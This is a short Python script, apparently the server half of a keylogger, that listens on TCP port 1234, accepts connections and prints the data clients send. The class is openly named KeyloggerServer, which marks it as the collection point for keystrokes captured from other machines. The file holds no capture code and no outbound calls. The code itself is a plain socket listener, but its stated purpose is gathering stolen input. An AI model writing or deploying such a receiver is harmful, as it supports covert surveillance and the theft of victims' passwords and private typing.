import socket


class KeyloggerServer(object):

    def start(self):
        server = socket.socket()
        server.bind(('', 1234))
        server.listen(5)  # socket in listening mode
        while True:
            client, address = server.accept()
            print('got connection ', address)
            response = client.recv(4096)
            print(response)
            print(response.decode())


def main():
    keylogger_server = KeyloggerServer()
    keylogger_server.start()


if __name__ == '__main__':
    main()
